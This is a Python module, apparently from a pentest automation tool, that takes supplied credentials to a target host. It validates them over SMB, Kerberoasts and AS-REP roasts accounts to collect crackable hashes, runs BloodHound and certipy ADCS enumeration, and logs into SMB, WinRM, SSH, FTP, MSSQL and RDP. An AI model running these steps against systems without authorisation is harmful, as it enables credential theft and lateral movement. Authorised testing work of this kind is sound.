from __future__ import annotations

import subprocess
from pathlib import Path

from lib.findings import Findings, ServiceBuffer
from lib.models import Service
from lib.runner import Runner
from lib.workspace import Workspace


# ── Helpers ───────────────────────────────────────────────────────────────────

def _trim(text: str, lines: int = 60) -> str:
    ls = text.strip().splitlines()
    return "\n".join(ls[:lines]) + ("\n…" if len(ls) > lines else "")


# ── Credential loading ────────────────────────────────────────────────────────

def load_creds(
    username: str | None,
    password: str | None,
    creds_file: str | None,
) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    if username and password:
        pairs.append((username, password))
    if creds_file:
        p = Path(creds_file)
        if not p.exists():
            print(f"[!] Creds file not found: {creds_file}")
        else:
            for line in p.read_text().splitlines():
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    user, _, pw = line.partition(":")
                    pairs.append((user.strip(), pw.strip()))
    seen: set[tuple[str, str]] = set()
    return [pair for pair in pairs if not (pair in seen or seen.add(pair))]  # type: ignore[func-returns-value]


# ── SMB credential validation ─────────────────────────────────────────────────

def _validate_smb(
    ip: str,
    creds: list[tuple[str, str]],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> list[tuple[str, str]]:
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping SMB credential validation")
        return []

    findings.h3("Credential Validation — SMB")
    valid: list[tuple[str, str]] = []
    rows: list[list[str]] = []

    for user, pw in creds:
        cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "--no-bruteforce"]
        out = runner.run(cmd, f"creds_smb_val_{user}", timeout=30)
        if "Pwn3d!" in out:
            status = "VALID (ADMIN)"
            ws.add_valid_cred(user, pw, "SMB")
            findings.add_summary(f"Admin SMB creds: `{user}`")
            valid.append((user, pw))
        elif "[+]" in out:
            status = "VALID"
            ws.add_valid_cred(user, pw, "SMB")
            valid.append((user, pw))
        else:
            status = "invalid"
        rows.append([user, pw[:2] + "***", status])

    findings.table(["User", "Password", "SMB"], rows)
    return valid


# ── AD Core ───────────────────────────────────────────────────────────────────

def _ad_core(
    ip: str,
    domain: str,
    user: str,
    pw: str,
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> None:
    findings.h3("AD Core Enumeration")

    # 1. ldapdomaindump — authenticated full domain dump
    if "ldapdomaindump" in available:
        out_dir = str(ws.loot_dir / "ldapdomaindump")
        cmd = [
            "ldapdomaindump",
            "-u", f"{domain}\\{user}",
            "-p", pw,
            "--no-json", "--no-grep",
            "-o", out_dir,
            f"ldap://{ip}",
        ]
        findings.h4("LDAP Domain Dump")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_ldapdomaindump", timeout=120)
        findings.code_block(_trim(out))
        findings.bullet(f"Full dump saved to `loot/ldapdomaindump/`")

    # 2. Kerberoasting — SPN accounts → crackable hashes
    if "impacket-GetUserSPNs" in available:
        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{user}:{pw}",
            "-dc-ip", ip,
            "-request",
        ]
        findings.h4("Kerberoasting (GetUserSPNs)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_getuserspns", timeout=60)
        hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
        if hashes:
            (ws.loot_dir / "kerberoast.hash").write_text("\n".join(hashes) + "\n")
            findings.bullet(f"**{len(hashes)} Kerberoastable hashes** → `loot/kerberoast.hash`")
            findings.add_summary(f"{len(hashes)} Kerberoastable accounts — crack with hashcat -m 13100")
        else:
            findings.code_block(_trim(out))

    # 3. AS-REP roasting — accounts with pre-auth disabled (authenticated gives full user list)
    if "impacket-GetNPUsers" in available:
        users_file = ws.loot_dir / "users.txt"
        if users_file.exists():
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/",
                "-dc-ip", ip,
                "-no-pass",
                "-request",
                "-usersfile", str(users_file),
            ]
        else:
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/{user}:{pw}",
                "-dc-ip", ip,
                "-request",
                "-all",
            ]
        findings.h4("AS-REP Roasting (GetNPUsers)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_getnpusers_auth", timeout=60)
        hashes = [line for line in out.splitlines() if "$krb5asrep$" in line]
        if hashes:
            asrep_path = ws.loot_dir / "asrep.hash"
            with asrep_path.open("a") as fh:
                fh.write("\n".join(hashes) + "\n")
            findings.bullet(f"**{len(hashes)} AS-REP hashes** appended → `loot/asrep.hash`")
            findings.add_summary(f"{len(hashes)} AS-REP roastable accounts — crack with hashcat -m 18200")
        else:
            findings.code_block(_trim(out))

    # 4. BloodHound collection
    if "bloodhound-python" in available:
        bh_dir = str(ws.bloodhound_dir)
        cmd = [
            "bloodhound-python",
            "-c", "All",
            "-u", user,
            "-p", pw,
            "-d", domain,
            "-dc", ip,
            "--dns-tcp",
            "--zip",
            "-o", bh_dir,
        ]
        findings.h4("BloodHound Collection")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_bloodhound", timeout=300)
        findings.code_block(_trim(out))
        zips = list(Path(bh_dir).glob("*.zip"))
        if zips:
            findings.bullet(f"**BloodHound data** → `loot/bloodhound/{zips[0].name}`")
            findings.add_summary("BloodHound collection complete — import zip into BloodHound GUI")

    # 5. ADCS template enumeration
    if "certipy" in available:
        cmd = [
            "certipy", "find",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-dc-ip", ip,
            "-stdout",
        ]
        findings.h4("ADCS Templates (certipy)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "creds_certipy", timeout=120)
        findings.code_block(_trim(out))
        if "ESC" in out:
            for line in out.splitlines():
                if "ESC" in line:
                    findings.add_summary(f"ADCS vuln: {line.strip()}")


# ── Per-service helpers ───────────────────────────────────────────────────────

def _creds_smb(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"SMB — {user}")
    if "smbmap" in available:
        cmd = ["smbmap", "-H", ip, "-u", user, "-p", pw, "-P", str(port)]
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, f"creds_smbmap_{port}_{user}", timeout=30)
        findings.code_block(_trim(out))
    if "nxc" in available:
        cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "--shares"]
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, f"creds_smb_shares_{user}", timeout=30)
        findings.code_block(_trim(out))
        if "READ" in out or "WRITE" in out:
            cmd2 = ["nxc", "smb", ip, "-u", user, "-p", pw, "--spider-folder", "\\"]
            findings.cmd(" ".join(cmd2))
            out2 = runner.run(cmd2, f"creds_smb_spider_{user}", timeout=120)
            findings.code_block(_trim(out2, lines=80))
            ws.add_valid_cred(user, pw, f"SMB:{port}")


def _creds_winrm(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"WinRM — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping WinRM test")
        return
    cmd = ["nxc", "winrm", ip, "-u", user, "-p", pw]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_winrm_val_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"WinRM:{port}")
        findings.add_summary(f"WinRM access: `{user}` on port {port}")
        for safe_cmd in ["whoami", "hostname"]:
            cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-x", safe_cmd]
            findings.cmd(" ".join(cmd2))
            out2 = runner.run(cmd2, f"creds_winrm_{safe_cmd}_{user}", timeout=20)
            findings.code_block(_trim(out2))


def _creds_ssh(
    ip: str, port: int, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace,
) -> None:
    findings.h4(f"SSH — {user}")
    full_cmd = [
        "sshpass", "-p", pw,
        "ssh",
        "-o", "BatchMode=no",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=8",
        "-o", "PasswordAuthentication=yes",
        "-p", str(port),
        f"{user}@{ip}",
        "whoami; hostname; id",
    ]
    findings.cmd(f"sshpass -p *** ssh -p {port} {user}@{ip} 'whoami; hostname; id'")
    out = runner.run(full_cmd, f"creds_ssh_{user}", timeout=20)
    findings.code_block(_trim(out))
    if out.strip() and "Permission denied" not in out and "Authentication failed" not in out:
        ws.add_valid_cred(user, pw, f"SSH:{port}")
        findings.add_summary(f"SSH access: `{user}` on port {port}")


def _creds_ftp(
    ip: str, port: int, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace,
) -> None:
    findings.h4(f"FTP — {user}")
    findings.cmd(f"curl -sk ftp://{ip}:{port}/ --user {user}:*** -l")
    try:
        result = subprocess.run(
            ["curl", "-sk", f"ftp://{ip}:{port}/", "--user", f"{user}:{pw}",
             "--connect-timeout", "10", "-l"],
            capture_output=True, text=True, timeout=15,
        )
    except subprocess.TimeoutExpired:
        findings.note(f"FTP connection timed out for `{user}`")
        return
    if result.returncode == 0:
        ws.add_valid_cred(user, pw, f"FTP:{port}")
        findings.add_summary(f"FTP access: `{user}` on port {port}")
        findings.bullet("**FTP login successful**")
        if result.stdout.strip():
            findings.code_block(result.stdout.strip())
        else:
            findings.bullet("(empty directory listing)")
    else:
        findings.note(f"FTP login failed for `{user}` (exit {result.returncode})")


def _creds_mssql(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"MSSQL — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping MSSQL test")
        return
    cmd = ["nxc", "mssql", ip, "-u", user, "-p", pw, "--port", str(port),
           "-q", "SELECT name FROM master..sysdatabases"]
    if domain:
        cmd += ["-d", domain]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_mssql_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"MSSQL:{port}")
        findings.add_summary(f"MSSQL access: `{user}` on port {port}")


def _creds_rdp(
    ip: str, port: int, domain: str | None, user: str, pw: str,
    runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
) -> None:
    findings.h4(f"RDP — {user}")
    if "nxc" not in available:
        findings.note("`nxc` not available — skipping RDP test")
        return
    cmd = ["nxc", "rdp", ip, "-u", user, "-p", pw, "--port", str(port)]
    if domain:
        cmd += ["-d", domain]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"creds_rdp_{user}", timeout=30)
    findings.code_block(_trim(out))
    if "[+]" in out:
        ws.add_valid_cred(user, pw, f"RDP:{port}")
        findings.add_summary(f"RDP access: `{user}` on port {port}")


# ── Per-service dispatcher ────────────────────────────────────────────────────

_SERVICE_HANDLERS: dict[int, str] = {
    21:   "ftp",
    22:   "ssh",
    139:  "smb",
    445:  "smb",
    1433: "mssql",
    3389: "rdp",
    5985: "winrm",
    5986: "winrm",
}

_NAME_HANDLERS: dict[str, str] = {
    "ftp":          "ftp",
    "ssh":          "ssh",
    "microsoft-ds": "smb",
    "netbios":      "smb",
    "ms-sql":       "mssql",
    "rdp":          "rdp",
    "winrm":        "winrm",
}


def _enumerate_services(
    ip: str,
    domain: str | None,
    creds: list[tuple[str, str]],
    services: list[Service],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> None:
    if not services:
        return
    findings.h3("Per-Service Credentialed Enumeration")

    seen_kinds: set[str] = set()
    for svc in services:
        kind = _SERVICE_HANDLERS.get(svc.port)
        if kind is None:
            for pat, k in _NAME_HANDLERS.items():
                if pat in svc.name.lower():
                    kind = k
                    break
        if kind is None:
            continue
        # Deduplicate: only enumerate each kind once (e.g. SMB on both 139 and 445)
        dedup_key = f"{kind}:{svc.port}"
        if dedup_key in seen_kinds:
            continue
        seen_kinds.add(dedup_key)

        buf = ServiceBuffer(svc.port, svc.proto)
        buf.h3(f"TCP {svc.port} — {svc.name.upper()} (credentialed)")

        for user, pw in creds:
            if kind == "smb":
                _creds_smb(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "winrm":
                _creds_winrm(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "ssh":
                _creds_ssh(ip, svc.port, user, pw, runner, buf, ws)
            elif kind == "ftp":
                _creds_ftp(ip, svc.port, user, pw, runner, buf, ws)
            elif kind == "mssql":
                _creds_mssql(ip, svc.port, domain, user, pw, runner, buf, ws, available)
            elif kind == "rdp":
                _creds_rdp(ip, svc.port, domain, user, pw, runner, buf, ws, available)

        findings.flush_service_buffer(buf)


# ── Main entry ────────────────────────────────────────────────────────────────

def run_creds_mode(
    ip: str,
    domain: str | None,
    creds: list[tuple[str, str]],
    services: list[Service],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    available: set[str],
) -> None:
    findings.h2("Credentialed Enumeration")

    if not creds:
        findings.note("No credentials provided.")
        return

    cred_list = ", ".join(f"`{u}`" for u, _ in creds)
    findings.bullet(f"Testing {len(creds)} credential set(s): {cred_list}")

    # Phase 1: Validate all creds against SMB (fast, works without domain)
    valid_smb = _validate_smb(ip, creds, runner, findings, ws, available)

    # Phase 2: AD core with best available cred (prefer validated, fall back to first provided)
    if domain:
        user, pw = valid_smb[0] if valid_smb else creds[0]
        _ad_core(ip, domain, user, pw, runner, findings, ws, available)
    else:
        findings.note("No `--domain` specified — skipping AD core enumeration")

    # Phase 3: Per-service credentialed enumeration against discovered services
    _enumerate_services(ip, domain, creds, services, runner, findings, ws, available)
